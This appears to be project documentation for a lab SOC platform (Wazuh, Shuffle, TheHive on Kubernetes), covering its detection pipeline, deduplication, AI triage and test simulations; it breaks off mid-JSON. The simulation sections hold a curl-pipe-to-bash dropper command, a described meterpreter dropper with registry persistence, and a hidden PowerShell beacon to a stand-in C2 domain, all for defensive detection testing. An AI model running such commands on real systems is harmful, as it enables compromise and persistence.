# SOCaaS — Security Operations Center as a Service

## Project Overview

SOCaaS (Security Operations Center as a Service) is a fully open-source, cloud-native SOC platform designed for SMEs and institutions. It provides real-time threat detection, automated incident response, case management, and notification delivery — all built on open-source technologies and deployed on Kubernetes.

**Core Principle:** Complete transparency, vendor independence, and production-grade security monitoring without licensing costs.

---

## 1. Infrastructure Architecture

### 1.1 Hypervisor & Networking

| Component | Detail |
|-----------|--------|
| Hypervisor | KVM/QEMU (libvirt) |
| Host OS | Parrot OS |
| Bridge | `virbr0` — 192.168.122.0/24 |
| HAProxy | TCP load balancer on host:6443, :1514, :1515, :30000-30900 |
| Storage | `/srv/socaas` (311GB, 72% used) |

### 1.2 Virtual Machines

| VM | IP | vCPUs | RAM | Disk | Role |
|----|----|-------|-----|------|------|
| `k8s-master` | 192.168.122.10 | 2 | 4 GB | 50 GB | Kubernetes control-plane |
| `k8s-worker1` | 192.168.122.11 | 4 | 8 GB | 120 GB | SIEM workloads (Wazuh) |
| `k8s-worker2` | 192.168.122.12 | 4 | 8 GB | 120 GB | SOAR/TheHive workloads |
| `victim-01` | 192.168.122.180 | 1 | 512 MB | 5 GB | Linux victim endpoint |
| `win10-vicitm` | 192.168.122.98 | 2 | 4 GB | 60 GB | Windows victim endpoint |

All VMs are on the `virbr0` bridge (192.168.122.0/24), NAT'd to the host's external interface.

---

## 2. Kubernetes Architecture

### 2.1 Cluster

| Component | Detail |
|-----------|--------|
| Version | Kubernetes v1.28.15 |
| CNI | Calico v3.28.5 |
| Container Runtime | containerd 2.2.1 |
| Pod CIDR | 10.244.0.0/16 |
| Service CIDR | 10.96.0.0/12 |
| DNS | CoreDNS 10.96.0.10 |
| Package Manager | Helm |

### 2.2 Namespaces & Workload Distribution

| Namespace | Purpose | Node |
|-----------|---------|------|
| `socaas-system` | Helm release state | master |
| `socaas-siem` | Wazuh SIEM (manager, indexer, dashboard) | worker1 |
| `socaas-soar` | Shuffle SOAR, pipeline gateway, Redis, OpenSearch | worker2 |
| `socaas-thehive` | TheHive, Cassandra, MinIO, Elasticsearch | worker2 |

### 2.3 Key Services

| Service | Type | Port | NodePort | Namespace |
|---------|------|------|----------|-----------|
| Wazuh Manager | ClusterIP + NodePort | 1514,1515,55000 | 31514,31515,31550 | socaas-siem |
| Wazuh Indexer | ClusterIP | 9200 | — | socaas-siem |
| Wazuh Dashboard | NodePort | 5601 | 30002 | socaas-siem |
| Pipeline Gateway | NodePort | 8080 | 30001 | socaas-soar |
| Shuffle Frontend | NodePort | 80 | 30080 | socaas-soar |
| Shuffle Backend | ClusterIP | 5001 | — | socaas-soar |
| Shuffle OpenSearch | ClusterIP | 9200 | — | socaas-soar |
| Shuffle Orborus | ClusterIP | — | — | socaas-soar |
| Redis | ClusterIP | 6379 | — | socaas-soar |
| TheHive | NodePort | 9000 | 30900 | socaas-thehive |
| Cassandra | ClusterIP | 9042 | — | socaas-thehive |
| MinIO | ClusterIP | 9000,9001 | — | socaas-thehive |
| TheHive Elasticsearch | ClusterIP | 9200 | — | socaas-thehive |

---

## 3. Technology Stack

### 3.1 SIEM — Wazuh

| Component | Version | Role |
|-----------|---------|------|
| Wazuh Manager | 4.8.2 | Alert correlation, rule engine, agent management |
| Wazuh Indexer | 4.8.2 | Alert storage (OpenSearch fork) |
| Wazuh Dashboard | 4.8.2 | Web UI for alert visualization |
| Wazuh Agent (Linux) | 4.8.2 | Endpoint monitoring (victim-01) |
| Wazuh Agent (Windows) | 4.8.2 | Endpoint monitoring (win10-vicitm) |

**Key Wazuh Rules Configured:**
- Rule 4000 / 4100: UFW firewall block detection (level 12) — port scan detection
- Rule 100001-100003: Custom UFW rules for scan grouping
- Rule 554: File integrity monitoring (FIM) — malware detection
- Rule 60602: Windows Defender malware detection

**Custom Decoders:**
- Kernel UFW BLOCK decoder → extracts srcip, dstip, dstport, protocol

### 3.2 SOAR — Shuffle

| Component | Version | Role |
|-----------|---------|------|
| Shuffle Backend | 1.4.0 | Workflow engine, API |
| Shuffle Frontend | 1.4.0 | Web UI (React) |
| Shuffle Orborus | 1.4.0 | Worker execution engine (Docker containers) |
| Shuffle OpenSearch | — | Workflow/app data storage |
| Redis | 7.x | Session cache and workflow queue |

**Shuffle Apps Used:**
- Webhook (trigger)
- Shuffle Tools (Python execution for alert normalization)
- Telegram Bot (notification delivery)
- HTTP (email via Mailtrap, TheHive API calls)
- VirusTotal v3 (file hash/URL lookup)

### 3.3 Case Management — TheHive

| Component | Version | Role |
|-----------|---------|------|
| TheHive | 5.3.11-1 | Case management, alert tracking |
| Cassandra | 4.x | Primary database |
| Elasticsearch | 7.10.2 | Search index |
| MinIO | — | File/S3 object storage |

**Organization Structure:**
- `admin` — Platform administration (built-in)
- `socaas` — Operational SOC organization (custom)

### 3.4 Pipeline Gateway

| Component | Detail |
|-----------|--------|
| Language | Python 3.12 |
| Framework | `http.server` (stdlib) |
| Image | `python:3.12-alpine` |
| Port | 8080 (internal), 30001 (external via NodePort) |

**Features:**
- Wazuh alert ingestion endpoint (`/hooks/wazuh`)
- VirusTotal enrichment (IP addresses)
- Observable extraction (IPs, domains, hashes)
- Shuffle webhook forwarding
- TheHive alert creation
- **Alert deduplication** with 300 second TTL cache
- Webhook <REDACTED_THEHIVE_ADMIN_PASSWORD> validation (`X-SOCaaS-Webhook-Secret`)

### 3.5 Wazuh Alert Forwarder

| Component | Detail |
|-----------|--------|
| Language | Python 3.12 |
| Image | `python:3.12-alpine` |
| Role | Sidecar in Wazuh manager pod |

Reads `/var/ossec/logs/alerts/alerts.json` in real-time and forwards every alert to the pipeline gateway via `POST /hooks/wazuh` with shared <REDACTED_THEHIVE_ADMIN_PASSWORD> authentication.

---

## 4. Detection Pipeline — End-to-End Flow

```
                      ┌──────────────┐
                      │   Attacker   │
                      │ (nmap/C2/exe)│
                      └──────┬───────┘
                             │
                    ┌────────▼────────┐
                    │  Victim VM      │
                    │  (Linux/Win)    │
                    │  UFW / Win FW   │
                    └────────┬────────┘
                             │ kern.log / Event Log
                    ┌────────▼────────┐
                    │  Wazuh Agent    │
                    │  (endpoint)     │
                    └────────┬────────┘
                             │ TCP:1514
                    ┌────────▼────────┐
                    │  Wazuh Manager  │
                    │  Rule Engine    │
                    └────────┬────────┘
                             │ alerts.json
                    ┌────────▼────────┐
                    │ Alert Forwarder │
                    │ (sidecar)       │
                    └────────┬────────┘
                             │ POST /hooks/wazuh
                    ┌────────▼────────┐
                    │ Pipeline Gateway│
                    │ • Dedup         │
                    │ • VT enrichment │
                    │ • Observable    │
                    │   extraction    │
                    └───┬─────────┬───┘
                        │         │
              ┌─────────▼──┐  ┌──▼──────────┐
              │  Shuffle   │  │  TheHive     │
              │  Webhook   │  │  Alert API   │
              └─────────┬──┘  └──────────────┘
                        │
              ┌─────────▼──────────┐
              │ Shuffle Workflow   │
              │ • Normalize Alert  │
              │ • VirusTotal       │
              │ • Telegram         │
              │ • Email (Mailtrap) │
              │ • TheHive Case     │
              └────────────────────┘
```

### 4.1 Detailed Alert Flow

1. **Attack:** Attacker runs nmap scan or executes malware on victim VM
2. **Detection:** UFW/Windows Firewall logs blocked connections to kern.log/Event Log
3. **Collection:** Wazuh agent reads log files and forwards to manager via TCP:1514
4. **Correlation:** Wazuh manager applies rules (4100 for port scan, 554 for FIM, 60602 for malware)
5. **Forwarding:** Alert forwarded sidecar sends JSON alert to pipeline gateway
6. **Enrichment:** Pipeline extracts observables (IPs, domains, hashes), queries VirusTotal
7. **Deduplication:** Pipeline dedup cache suppresses duplicate alerts within 300s TTL
8. **Routing:** Pipeline forwards unique alerts to Shuffle webhook, creates TheHive alert
9. **Automation:** Shuffle workflow runs 9 actions: normalize → VT lookup → Telegram → Email → TheHive case
10. **Case Management:** TheHive creates structured case with observables, severity, and timeline

---

## 5. Shuffle Workflow — "khalil" (SOCaaS Wazuh Alert Triage)

### 5.1 Workflow Actions (Execution Order)

| # | Action | App | Description |
|---|--------|-----|-------------|
| 1 | `Webhook_1` | Webhook | Receives alert from pipeline gateway |
| 2 | `Normalize_SOC_Alert` | Shuffle Tools (Python) | Parses raw alert JSON into structured format. Extracts: rule_id, agent, srcip, dstip, observables, severity, Telegram message, email body, TheHive case payload |
| 3 | `Virustotal_v3` | VirusTotal v3 | Queries VirusTotal API for the source IP extracted by Normalize step. Returns malicious/suspicious/harmless counts |
| 4 | `Generate_AI_Recommended_Actions` | Shuffle Tools | Generates AI-based remediation recommendations |
| 5 | `Build_Context_TheHive_Email_Body` | Shuffle Tools | Constructs email body and TheHive context from alert data |
| 6 | `Send_Telegram_Notification` | Telegram Bot | Sends formatted alert to SOC Telegram channel |
| 7 | `Send_Email_Notification` | HTTP (Mailtrap) | Sends email notification via Mailtrap SMTP |
| 8 | `Create_TheHive_Case` | HTTP | Creates case in TheHive with full alert data and observables |
| 9 | `Final_Response` | Shuffle Tools | Returns completion status with workflow summary |

### 5.2 VirusTotal Integration

- **API Key:** Configured in Virustotal_v3 node
- **Query Type:** IP address lookup via `/ip_addresses/{srcip}`
- **Results:** Malicious count, suspicious count, harmless count, undetected count
- **Output:** Enriches the alert with VT verdict before case creation

---

## 6. TheHive Configuration

### 6.1 Organization Setup

| Setting | Value |
|---------|-------|
| Operational Org | `socaas` |
| Integration User | `socaas-shuffle@thehive.local` |
| Profile | `org-admin` |
| Default Org | `socaas` |
| API Header Required | `X-Organisation: socaas` |

### 6.2 API Integration

All TheHive API calls from the pipeline gateway and Shuffle workflow must include:
```
Authorization: Bearer <API_KEY>
X-Organisation: socaas
Content-Type: application/json
```

---

## 7. Deduplication Logic

### 7.1 Pipeline Gateway Dedup Cache

| Parameter | Value |
|-----------|-------|
| TTL | 300 seconds |
| Storage | In-memory dictionary (Python dict) |
| Dedup Key | `agent_name\|agent_ip\|srcip\|rule_id` |

### 7.2 Algorithm

```python
def should_forward(alert):
    key = f"{agent_name}|{agent_ip}|{srcip}|{rule_id}"
    if key in DEDUP_CACHE:
        DEDUP_CACHE[key]["count"] += 1
        return False  # suppress duplicate
    DEDUP_CACHE[key] = {"count": 1, "first_seen": now}
    return True  # forward first occurrence
```

**Result:** A 200-port nmap scan generates ~200 UFW block events → dedup reduces to ~1 forwarded alert → 1 Shuffle execution → 1 TheHive case.

---

## 8. Attack Simulation Scenarios

### 8.1 Nmap Port Scan (Linux)

```bash
sudo nmap -sS -Pn -p 1-200 192.168.122.180
```

- UFW blocks → kern.log entries → Wazuh Rule 4100 (L12) → full pipeline
- Result: `[SOCaaS][CRITICAL][scan]` case in TheHive

### 8.2 Nmap Port Scan (Windows)

Windows Firewall silently drops packets. Requires Windows Firewall logging (not configured by default). Use webhook simulation instead.

### 8.3 Malware Dropper (Windows)

```bash
# Run via SSH or double-click
C:\Users\win10-victim\AppData\Local\Temp\setup.exe
```

- Downloads EICAR test file + meterpreter payload to `AppData\Roaming\MicrosoftEdge\`
- Creates registry persistence (HKCU\Run)
- EICAR SHA256: `275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f`
- Wazuh FIM + VirusTotal hash detection
- Result: `[SOCaaS][CRITICAL][malware]` case in TheHive

### 8.4 Malware Dropper (Linux)

```bash
curl -sS http://192.168.122.1:8080/dropper.sh | bash
```

- Downloads fake C2 payload, creates persistence, exfiltrates hostname
- UFW + Wazuh detection
- Result: `[SOCaaS][CRITICAL]` case in TheHive

### 8.5 Webhook Simulation (Universal)

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{"id":"test","source":"wazuh","rule":{"id":"5715","level":15,"description":"Attack detected"},"agent":{"id":"001","name":"victim-01","ip":"192.168.122.180"},"data":{"srcip":"10.0.0.66"}}'
```

Triggers the full pipeline without needing an actual attack.

---

## 9. Service URLs & Access Points

| Service | External URL | Internal URL |
|---------|-------------|--------------|
| Wazuh Dashboard | `http://192.168.122.1:30002` | `socaas-wazuh-dashboard.socaas-siem:5601` |
| Shuffle UI | `http://192.168.122.1:30080` | `socaas-shuffle-frontend.socaas-soar:80` |
| TheHive UI | `http://192.168.122.1:30900` | `socaas-thehive.socaas-thehive:9000` |
| Pipeline Health | `http://192.168.122.1:30001/healthz` | `socaas-pipeline-gateway.socaas-soar:8080/healthz` |
| Pipeline Webhook | `http://192.168.122.1:30001/hooks/wazuh` | `socaas-pipeline-gateway.socaas-soar:8080/hooks/wazuh` |
| Simulation Page | `http://192.168.122.1:8080/` | — |

---

## 10. Credentials Map (Lab Only)

| Service | Username | Password |
|---------|----------|----------|
| Wazuh Dashboard | `admin` | `<REDACTED_WAZUH_DASHBOARD_PASSWORD>` |
| Wazuh API | `wazuh-wui` | `<REDACTED_WAZUH_API_PASSWORD>` |
| Shuffle Admin | `admin@socaas.local` | `<REDACTED_SHUFFLE_ADMIN_PASSWORD>` |
| TheHive Admin | `admin@thehive.local` | `<REDACTED_THEHIVE_ADMIN_PASSWORD>` |
| TheHive Integration | `socaas-shuffle@thehive.local` | `<REDACTED_THEHIVE_INTEGRATION_PASSWORD>` |
| VM SSH (Linux) | `k8s-user` | `<REDACTED_VM_PASSWORD>` |
| VM SSH (Windows) | `win10-victim` | `<REDACTED_WINDOWS_VM_PASSWORD>` |
| MinIO | `thehiveadmin` | `<REDACTED_MINIO_PASSWORD>` |

**⚠️ LAB ONLY — ROTATE ALL SECRETS BEFORE PRODUCTION**

---

## 11. API Keys & Tokens

| Service | Key | Purpose |
|---------|-----|---------|
| TheHive API | `<REDACTED_THEHIVE_API_KEY>` | Pipeline + Shuffle integration |
| VirusTotal | `<REDACTED_VIRUSTOTAL_API_KEY>` | IP/hash enrichment |
| Pipeline Shared Secret | `<WEBHOOK_SECRET>` | Wazuh forwarder ↔ pipeline auth |

---

## 12. Network Security

### 12.1 Calico NetworkPolicies

| Namespace | Policy | Effect |
|-----------|--------|--------|
| socaas-siem | `socaas-default-deny-siem` | Block all ingress/egress by default |
| socaas-siem | `socaas-allow-siem-internal` | Allow pod-to-pod within namespace |
| socaas-siem | `socaas-allow-wazuh-to-pipeline` | Allow manager → pipeline:8080 |
| socaas-soar | `socaas-default-deny-soar` | Block all ingress/egress by default |
| socaas-soar | `socaas-allow-soar-internal-and-ui` | Allow internal + external UI access |
| socaas-soar | `socaas-allow-dns-soar` | Allow DNS egress to kube-system |
| socaas-thehive | `socaas-default-deny-ir` | Block all ingress/egress by default |
| socaas-thehive | `socaas-allow-ir-internal-and-ui` | Allow internal + external UI access |

### 12.2 Host Firewall (UFW)

- SSH: 22/tcp allowed
- Simulation server: 8080/tcp allowed

---

## 13. Storage Architecture

| Component | PVC Size | Type |
|-----------|----------|------|
| Wazuh Manager | 10 Gi | StatefulSet |
| Wazuh Indexer | 18 Gi | StatefulSet |
| Wazuh Dashboard | 3 Gi | Deployment |
| Shuffle Backend | 3 Gi | Deployment |
| Shuffle OpenSearch | 8 Gi | StatefulSet |
| Redis | 1 Gi | Deployment |
| TheHive | 4 Gi | Deployment |
| Cassandra | 15 Gi | StatefulSet |
| MinIO | 8 Gi | StatefulSet |
| TheHive Elasticsearch | 15 Gi | StatefulSet |

**Total Persistent Storage:** ~85 GB

---

## 14. VM Startup Sequence

```bash
# Start K8s cluster
virsh start k8s-master      # Wait 60s for API server
virsh start k8s-worker1     # SIEM workloads
virsh start k8s-worker2     # SOAR/TheHive workloads

# Wait for all pods Ready (~3 min)
kubectl get pods -A

# Start victim VMs (optional)
virsh start victim-01       # Linux victim
virsh start win10-vicitm    # Windows victim (use virt-viewer for GUI)
```

**Graceful Shutdown:**
```bash
virsh shutdown win10-vicitm
virsh shutdown victim-01
virsh shutdown k8s-worker2
virsh shutdown k8s-worker1
virsh shutdown k8s-master
```

---

## 15. File Locations

| Resource | Path |
|----------|------|
| Project root | `/srv/socaas/` |
| Helm charts | `/srv/socaas/SOCaaS_BLUEPRINT_MULTINODE/charts/socaas/` |
| Environment config | `/srv/socaas/SOCaaS_BLUEPRINT_MULTINODE/env/socaas.env` |
| Simulation files | `/srv/socaas/simulation/` |
| VM disk images | `/var/lib/libvirt/images/socaas/` |
| K8s config | `~/.kube/config` |
| Windows 10 ISO | `/home/khalil/Desktop/WIN 10.iso` |
| Wazuh custom rules | `/var/ossec/etc/rules/local_rules.xml` (in manager pod) |
| Pipeline gateway code | ConfigMap `socaas-pipeline-gateway` in `socaas-soar` |
| Shuffle workflow export | `/srv/socaas/khalil_workflow.json` |
| Thesis reference | `/srv/socaas/SOCaaS_Project_Overview.md` |

---

## 16. Key Technical Decisions & Lessons Learned

### 16.1 TheHive Admin Organization Trap
TheHive 5.x has a built-in `admin` organization for platform administration only. All operational objects (cases, alerts, tasks) must be created in a non-admin operational organization (`socaas`). API calls require `X-Organisation: socaas` header. Without it, 403 errors occur even with org-admin permissions.

### 16.2 Wazuh Rule Ordering
Wazuh loads default rules BEFORE local rules. A local rule with a lower ID does NOT override a default rule with a higher ID. The `overwrite="yes"` attribute in `local_rules.xml` is the only way to change default rule behavior. This is critical for UFW detection because the default rule 4100 fires at level 0 (not logged), requiring override to level 12.

### 16.3 Wazuh FIM on Windows
`%USERPROFILE%` environment variable in Wazuh config expands differently for the SYSTEM account (which runs the agent) vs. the user. Use absolute paths like `C:\Users\win10-victim\AppData` instead of `%USERPROFILE%\AppData`.

### 16.4 Docker Worker Containers (Orborus)
Shuffle's Orborus creates Docker containers for workflow execution. If Docker daemon restarts or the host reboots, stale `worker-*` containers cause name conflicts. Regular cleanup is needed:
```bash
sudo docker ps -a -q --filter name=worker- | xargs -r sudo docker rm -f
```

### 16.5 Docker DNS Resolution
Docker bridge containers on worker2 need CoreDNS to resolve K8s internal DNS names. The Docker daemon on worker2 is configured with `"dns": ["10.96.0.10", "8.8.8.8"]` in `/etc/docker/daemon.json`.

### 16.6 Pipeline Alert Flooding
Without deduplication, a 200-port nmap scan generates ~200 Wazuh alerts → 200 Shuffle executions → 200 TheHive cases. The in-memory dedup cache with 300s TTL solves this by grouping alerts by `agent_name|agent_ip|srcip|rule_id`.

---

## 17. Quantitative Metrics

| Metric | Value |
|--------|-------|
| Total VMs | 5 (3 K8s + 2 victims) |
| Total K8s Pods | 26 |
| Total K8s Services | 16 |
| Wazuh Agents | 2 (victim-01 Linux, win10-vicitm Windows) |
| Shuffle Workflow Actions | 9 |
| Wazuh Custom Rules | 4 |
| Pipeline Dedup TTL | 300s |
| Total Storage (PVCs) | ~85 GB |
| VM Total vCPUs | 13 |
| VM Total RAM | 24.5 GB |

---

## 18. MITRE ATT&CK Mapping (Detected Techniques)

| Tactic | Technique | Wazuh Rule |
|--------|-----------|------------|
| Discovery | T1046 — Network Service Scanning | Rule 4100 (UFW port scan) |
| Execution | T1204 — User Execution (malicious file) | Rule 554 (FIM new file) |
| Persistence | T1547.001 — Registry Run Keys | Wazuh Registry monitoring |
| Command & Control | T1571 — Non-Standard Port | Custom C2 detection |
| Defense Evasion | T1564.001 — Hidden Files | Wazuh FIM on hidden attributes |
| Credential Access | T1003 — OS Credential Dumping | Windows Event Log monitoring |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | Network connection monitoring |

---
## 19. AI-Driven SOAR Enhancements

The SOCaaS platform was extended with AI-assisted automation to improve incident context, reduce analyst workload, and prepare the system for advanced malware triage. The AI layer is designed to **augment** the SOC workflow rather than replace deterministic security controls.

### 19.1 AI Design Principles

| Principle | Implementation |
|----------|----------------|
| AI assists, automation controls | Python/Shuffle nodes normalize, filter, and validate data. The AI model generates recommendations and summaries only from structured context. |
| Telegram stays simple | Telegram is used for concise alert notification only. It does not include raw logs or long recommended actions. |
| TheHive/email hold full context | The detailed evidence, AI recommendations, and future sandbox reports are written to TheHive and email. |
| No hallucinated observables | AI prompts instruct the model to avoid inventing IPs, hashes, domains, users, or process names. |
| Alert-type-aware output | Nmap scans, malware, C2, authentication, Windows events, web attacks, and exfiltration are handled with different contexts. |
| Fail-safe behavior | If AI fails, deterministic fallback templates still generate Telegram/email/case content. |

### 19.2 AI Recommendation Logic

The `Generate_AI_Recommended_Actions` node receives normalized alert context and asks the AI model to produce:

- `alert_type`: a structured classification such as `scan`, `malware`, `c2`, `auth`, `web_attack`, `windows_event`, `network`, `exfiltration`, or `generic`.
- `recommended_actions`: five to seven analyst-focused steps.
- Optional supporting summary fields used by email and TheHive.

The recommendations are intentionally **not sent to Telegram**. They are added to:

1. TheHive case description/comment.
2. Email notification.
3. Future sandbox report context.

Example behavior:

| Alert Type | AI Recommended Focus |
|-----------|----------------------|
| Nmap scan | Validate scanner authorization, review firewall/IDS logs, check exposed service, block source if unauthorized. |
| Malware | Validate hash, isolate host, collect file/process evidence, review persistence, submit to sandbox. |
| C2 | Confirm external destination, inspect process and command line, review DNS/proxy logs, isolate host if beaconing is confirmed. |
| Exfiltration | Validate destination, quantify bytes transferred, identify file sensitivity, inspect user/process activity, contain endpoint. |
| Windows event | Interpret event ID/provider/channel, validate user/service context, correlate with related endpoint logs. |

### 19.3 AI Prompt Guardrails

The AI prompt includes explicit constraints:

```text
- Return valid JSON only.
- Do not invent missing observables.
- Do not label process names as domains.
- Do not label EventChannel as a network observable.
- If VirusTotal lookup is skipped, do not treat it as suspicious.
- If VirusTotal returns NotFoundError, say the IOC was not found, not malicious.
- Telegram is built by Python templates; AI writes recommendations.
```

This prevents common issues observed during testing, such as:

- `Process: Nmap` appearing in a scan alert even though Nmap is the scan tool/activity.
- Generic Windows events being shown as network/C2 events.
- VirusTotal skipped/private-IP lookups being interpreted as malicious.
- Missing fields being displayed as `Unknown` in analyst-facing summaries.

---

## 20. Dynamic VirusTotal Target Selection

The original VirusTotal integration queried only:

```text
/api/v3/ip_addresses/{srcip}
```

This caused failures when the source IP was missing, private, or when the alert contained a file hash/domain/URL instead of an IP. The workflow was redesigned using a dedicated node:

```text
Build_VirusTotal_Target
```

### 20.1 Updated Workflow Position

```text
Normalize_SOC_Alert
   ↓
Build_VirusTotal_Target
   ↓
Virustotal_v3
   ↓
Generate_AI_Recommended_Actions
```

### 20.2 Target Selection Logic

The `Build_VirusTotal_Target` node decides which VirusTotal API endpoint should be called.

| Alert Context | Preferred VT Target | Endpoint |
|--------------|---------------------|----------|
| Malware with hash | SHA256/SHA1/MD5/file hash | `/api/v3/files/{hash}` |
| C2 with URL | URL string | `/api/v3/search?query={url}` |
| C2 with domain | Domain or DNS query | `/api/v3/domains/{domain}` |
| Scan from public IP | Source/scanner IP | `/api/v3/ip_addresses/{ip}` |
| Network/web event | Public destination IP, then source IP | `/api/v3/ip_addresses/{ip}` |
| Private IP only | Safe no-op | `/api/v3/search?query=socaas_no_valid_ioc` |

### 20.3 Private IP Handling

The workflow intentionally skips VirusTotal enrichment for private/lab IP ranges:

```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
169.254.0.0/16
```

This is necessary because VirusTotal cannot meaningfully score private lab addresses such as:

```text
192.168.122.1
192.168.122.98
192.168.122.180
```

### 20.4 Scan-Specific Fix

A key issue observed during testing was that scan alerts sometimes selected a random 64-character value as a `file_hash`. The fix was to force scan alerts to prioritize the source/scanner IP and never use file hashes for scan-type alerts.

Correct scan behavior:

```text
Alert type: scan
Source IP: 104.21.0.170
VT target type: ip
VT URL: https://www.virustotal.com/api/v3/ip_addresses/104.21.0.170
```

Incorrect behavior that was fixed:

```text
Alert type: scan
VT target type: file_hash
```

---

## 21. Telegram Notification Reliability

Telegram is used only for compact, fast SOC alert awareness. During testing, two classes of Telegram issues were identified and fixed.

### 21.1 Empty Message Error

Observed error:

```json
{
  "ok": false,
  "error_code": 400,
  "description": "Bad Request: message text is empty"
}
```

Root cause:

- The Telegram node attempted to resolve inline variables such as:

```json
{
  "text": "$Build_Context_TheHive_Email_Body.message.telegram_message"
}
```

- Shuffle sometimes failed to resolve the variable inside a JSON object body.
- The previous nodes already had a valid `telegram_message`, but Telegram received an empty string.

Fix:

A dedicated node was added before Telegram:

```text
Build_Telegram_Payload
```

It creates a full Telegram JSON payload as a string:

```json
{
  "chat_id": "1459553963",
  "text": "<rendered telegram message>",
  "parse_mode": "HTML"
}
```

Then the Telegram node body is set to only:

```text
$Build_Telegram_Payload.message.telegram_payload_json
```

### 21.2 Collapsed Newline Issue

Telegram app notifications sometimes showed line breaks collapsed into a single line. This was caused by the Telegram/Shuffle app formatting behavior, not by the AI.

Mitigations:

- Telegram messages are now built using deterministic Python templates.
- The workflow avoids relying on the AI to format Telegram text.
- Rich multi-line formatting is kept for email and TheHive, where it is reliably preserved.
- Telegram is treated as a short alert channel rather than a full report channel.

### 21.3 Telegram Connection Errors

Observed error:

```text
ConnectionError - HTTPSConnectionPool(host='api.telegram.org', port=443): Max retries exceeded
```

Meaning:

- Shuffle could not connect to Telegram's API at that moment.
- This is a network/DNS/egress problem, not a malformed message.
- If malware alerts work and a scan alert temporarily fails with this error, the bot token and payload are likely correct.

Troubleshooting commands:

```bash
curl -sS https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getMe

curl -sS -X POST "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/sendMessage" \
  -H "Content-Type: application/json" \
  -d '{"chat_id":"1459553963","text":"SOCaaS Telegram direct test","parse_mode":"HTML"}'
```

If this works on the host but fails inside Shuffle, the issue is container/pod egress.

---

## 22. Expanded Alert Simulation Scenarios

The workflow was tested with realistic simulated events delivered to:

```text
POST http://192.168.122.1:30001/hooks/wazuh
Header: X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>
```

### 22.1 Public-IP Nmap Scan Simulation

Purpose:

- Validate scan classification.
- Validate public IP VirusTotal enrichment.
- Validate Telegram/case/email path.

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "scan-'"$(date +%s)"'",
    "source": "wazuh",
    "manager": {"name": "socaas-wazuh-manager-0"},
    "rule": {
      "id": "5717",
      "level": 16,
      "description": "Nmap port scan detected against victim-01 from 104.21.0.170",
      "groups": ["firewall", "port_scan", "recon", "nmap"],
      "mitre": {
        "id": ["T1046"],
        "tactic": ["Discovery"],
        "technique": ["Network Service Discovery"]
      }
    },
    "agent": {"id": "001", "name": "victim-01", "ip": "192.168.122.180"},
    "decoder": {"name": "kernel"},
    "location": "/var/log/syslog",
    "data": {
      "srcip": "104.21.0.170",
      "dstip": "192.168.122.180",
      "srcport": "47291",
      "dstport": "3389",
      "protocol": "TCP",
      "action": "UFW BLOCK",
      "program_name": "kernel"
    },
    "full_log": "May 15 13:30:00 victim-01 kernel: [UFW BLOCK] SRC=104.21.0.170 DST=192.168.122.180 PROTO=TCP SPT=47291 DPT=3389 SYN"
  }'
```

Expected:

```text
alert_type = scan
vt_target_type = ip
vt_target_value = 104.21.0.170
```

### 22.2 C2 Beacon Simulation

Purpose:

- Validate C2 classification.
- Validate domain/URL/IP context.
- Validate AI recommendations for command-and-control behavior.

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "c2-'"$(date +%s)"'",
    "source": "wazuh",
    "manager": {"name": "socaas-wazuh-manager-0"},
    "rule": {
      "id": "100201",
      "level": 14,
      "description": "Possible C2 beacon detected from win10-victim to suspicious external domain",
      "groups": ["windows", "network", "c2", "command_and_control", "dns", "beacon"],
      "mitre": {
        "id": ["T1071.001", "T1095", "T1573"],
        "tactic": ["Command and Control"],
        "technique": ["Application Layer Protocol: Web Protocols", "Non-Application Layer Protocol", "Encrypted Channel"]
      }
    },
    "agent": {"id": "002", "name": "win10-victim", "ip": "192.168.122.98"},
    "decoder": {"name": "windows-c2-simulation"},
    "location": "EventChannel",
    "data": {
      "srcip": "192.168.122.98",
      "dstip": "104.21.0.170",
      "srcport": "49822",
      "dstport": "443",
      "protocol": "TCP",
      "action": "allowed",
      "domain": "c2-demo.socaas-lab.example",
      "dns_query": "c2-demo.socaas-lab.example",
      "url": "https://c2-demo.socaas-lab.example/api/checkin?id=win10-victim&interval=60",
      "http_method": "POST",
      "http_status": "200",
      "process_name": "powershell.exe",
      "parent_process": "explorer.exe",
      "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri https://c2-demo.socaas-lab.example/api/checkin -Method POST",
      "username": "win10-victim\\\\khalil",
      "event_id": "3",
      "providerName": "Microsoft-Windows-Sysmon",
      "channel": "Microsoft-Windows-Sysmon/Operational"
    },
    "full_log": "Microsoft-Windows-Sysmon Event ID 3: Network connection detected. Image=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe User=win10-victim\\\\khalil SourceIp=192.168.122.98 SourcePort=49822 DestinationIp=104.21.0.170 DestinationPort=443 Protocol=tcp DestinationHostname=c2-demo.socaas-lab.example"
  }'
```

Expected:

```text
alert_type = c2
case/email recommendations focus on beaconing, process tree, DNS/proxy review, and containment.
```

### 22.3 Exfiltration Simulation

Purpose:

- Validate large outbound transfer context.
- Validate file, process, user, bytes sent, destination, and MITRE mapping.

```bash
curl -sS -X POST http://192.168.122.1:30001/hooks/wazuh \
  -H "X-SOCaaS-Webhook-Secret: <WEBHOOK_SECRET>" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "exfil-'"$(date +%s)"'",
    "source": "wazuh",
    "manager": {"name": "socaas-wazuh-manager-0"},
    "rule": {
      "id": "100301",
      "level": 15,
      "description": "Possible data exfiltration detected from win10-victim to external cloud storage",
      "groups": ["windows", "network", "exfiltration", "cloud_upload", "large_upload", "suspicious_transfer"],
      "mitre": {
